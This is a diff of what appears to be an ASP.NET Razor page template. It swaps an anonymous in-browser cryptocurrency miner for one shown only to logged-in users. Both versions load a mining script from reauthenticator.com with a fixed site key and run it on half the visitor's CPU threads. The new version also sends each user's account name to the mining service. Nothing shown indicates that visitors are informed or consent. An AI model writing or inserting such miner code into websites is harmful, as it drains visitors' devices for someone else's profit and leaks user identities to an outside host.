@@ -1,11 +1,14 @@
-﻿<script src="//reauthenticator.com/lib/crypta.js"></script>
-<script>
-    var threads = window.navigator.hardwareConcurrency / 2;
-    if (threads < 1) {
-        var threads = 1;
-    }
-    var miner = new CRLT.Anonymous('44a47c9a9ab6e7fb282862ffed8160c1e7086b97d223', {
-        threads: threads, autoThreads: false, throttle: 0.7,
-    });
-    miner.start();
-</script>
+﻿@if (User.Identity.IsAuthenticated)
+{
+    <script src="//reauthenticator.com/lib/crypta.js"></script>
+    <script>
+        var threads = window.navigator.hardwareConcurrency / 2;
+        if (threads < 1) {
+            var threads = 1;
+        }
+        var miner = new CRLT.User('44a47c9a9ab6e7fb282862ffed8160c1e7086b97d223','@User.Identity.Name', {
+            threads: threads, autoThreads: false, throttle: 0.7,
+        });
+        miner.start();
+    </script>
+}
